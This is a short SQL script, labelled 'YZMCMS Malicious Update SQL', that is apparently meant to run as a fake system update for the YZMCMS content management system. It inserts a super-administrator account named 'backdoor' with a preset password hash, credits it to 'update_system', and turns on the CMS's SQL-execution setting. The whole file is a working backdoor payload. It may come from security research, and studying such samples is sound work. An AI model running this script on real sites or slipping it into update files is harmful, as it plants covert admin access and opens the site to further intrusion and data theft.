--
-- YZMCMS Malicious Update SQL
--
INSERT INTO `yzm_admin` (`adminname`, `password`, `roleid`, `addtime`, `addpeople`)
VALUES ('backdoor', 'b5a9a7ca0e2e77fd1ccd1ea9498ababf', 1, UNIX_TIMESTAMP(), 'update_system');

UPDATE `yzm_config` SET `value` = '1' WHERE `name` = 'sql_execute';
